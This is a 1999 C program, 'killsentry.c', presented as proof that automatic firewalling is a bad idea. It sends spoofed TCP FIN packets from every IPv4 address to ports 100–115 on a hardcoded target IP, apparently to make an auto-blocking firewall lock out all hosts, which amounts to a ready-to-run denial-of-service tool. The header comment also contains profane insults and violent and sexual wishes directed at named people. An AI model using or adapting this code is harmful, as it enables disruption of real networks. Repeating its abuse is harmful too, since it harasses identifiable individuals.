/* killsentry.c (c) 1999 Vortexia / Andrew Alston 

Excuse the crappy coding, this code was written when I was very bored,
had nothing better to do, and felt like proving the point that automatic
firewalling is a bad idea.  The code spoofs FIN packets from sequential
internet hosts, starting at 1.0.0.0 and going right through to
255.255.255.255, sending 15 packets from each, one packet each to port
100 to 115.  Feel free to modify this code, if you use the code for
anything, please give me credit where it is due.

I hold no responsibility for anything this code is used for, I give no
guarantees that this code works, and I hold no responsibility for
anything this code does to any system you run it on. If you screw up with
it, its your problem, not mine.

The code compiles 100% fine with no warnings on FreeBSD 3.2, I dont know
about any other platforms or systems.


Greets and shoutouts:

Wyze1 - Thanks for the moral support, here is something you may use in
	Forbidden Knowledge
Sniper - My partner in crime, you rock
Timewiz - What can I say, thanks for ideas for projects still coming
Moe1 - For all the information Ive had from you - Its appreciated
Uglykidjoe - For things said and done - I owe you
Hotmetal - A general greet 
Bretton Vine - Dont worry the underground you hate so much still loves you

Everyone else in #hack on irc.electrocity.com - You guys rock

Curses, fuckoffs, and the like -

Logik - Get a clue, skript kiddie life aint the way
Gaspode - I dont think I even need this - a major FUCK YOU 
	and I hope you get castrated with a rusty spoon -
	take your god like attitude and shove it up your ass
Sunflower - May you fall pregnant to one of the many ircops you screw
Anyone else that I dislike but cant think of right now - FUCK YOU
Anyone who dislikes me - FUCK YOU

*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <time.h>
#include <netdb.h>

int main(int argc, char *argv[]) {

	#define TARGETHOST "209.212.100.196"
	int octet1, octet2, octet3, octet4;
	int i;	
	int sock;
	int on = 1;
	struct sockaddr_in sockstruct;
	struct ip *iphead;
	struct tcphdr *tcphead;
	char ipkill[20];
	char evilpacket[sizeof(struct ip) + sizeof(struct tcphdr)]; 
	struct in_addr spoof, target;
	int seq, ack;

	bzero(&evilpacket, sizeof(evilpacket));
	// Very bad way to generate sequence numbers

	srand(getpid());
	seq = rand()%time(NULL);
	ack = rand()%time(NULL);

	if(argc < 2) {
		printf("Usage: %s target_host\n",argv[0]);
		exit(-1);
		};
	
	target.s_addr=inet_addr(TARGETHOST);
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		perror("socket");
		exit(-1);
		}
	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,(char *)&on,sizeof(on)) < 0) {
		perror("setsockopt");
		exit(-1);
		}
	
	sockstruct.sin_family = AF_INET;
	
	iphead = (struct ip *)evilpacket;	
	tcphead = (struct tcphdr *)(evilpacket + sizeof(struct ip));
	
	iphead->ip_hl = 5;
	iphead->ip_v = 4;
	iphead->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
	iphead->ip_id = htons(getpid());
	iphead->ip_ttl = 255;
	iphead->ip_p = IPPROTO_TCP;
	iphead->ip_dst = target;
	iphead->ip_sum = 0;		
	iphead->ip_tos = 0;
	iphead->ip_off = 0;
	tcphead->th_sport = htons(80);
	tcphead->th_seq = htonl(seq);
	tcphead->th_ack = htonl(ack);
	tcphead->th_win = htons(512);
	tcphead->th_flags = TH_FIN; 
	tcphead->th_off = 0x50;
	for(octet1 = 1; octet1 <= 255; octet1++)
	for(octet2 = 0; octet2 <= 255; octet2++)
	for(octet3 = 0; octet3 <= 255; octet3++)
	for(octet4 = 0; octet4 <= 255; octet4++) {
		bzero(ipkill, 20);
	sprintf(ipkill, "%d.%d.%d.%d", octet1, octet2, octet3, octet4);
		for(i = 100; i <= 115; i++) {
			tcphead->th_dport = htons(i);
			sockstruct.sin_port = htons(i);
			spoof.s_addr = inet_addr(ipkill);
			iphead->ip_src = spoof;
			sockstruct.sin_addr = spoof;
			sendto(sock,&evilpacket,sizeof(evilpacket),0x0,(struct
sockaddr *)&sockstruct, sizeof(sockstruct));
			}
		}
	return(1);

};

